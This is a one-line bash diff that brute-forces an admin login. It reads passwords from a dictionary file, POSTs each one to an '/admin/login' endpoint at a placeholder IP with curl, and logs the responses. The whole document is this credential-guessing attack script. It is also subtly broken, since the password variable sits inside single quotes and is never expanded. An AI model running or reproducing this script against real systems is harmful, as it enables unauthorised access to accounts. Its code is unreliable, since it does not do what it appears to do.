@@ -1,0 +1,1 @@
+while read -r line;do q=$(curl -skL -H "Content-Type: application/json" -X POST http://IP.IP.IP.IP:5000/admin/login -d '{"login":"admin", "password":"$line"}');echo "resp:$q,pass:$line"; done < ../dictionary/s_pass_admin.txt > wynik.txt
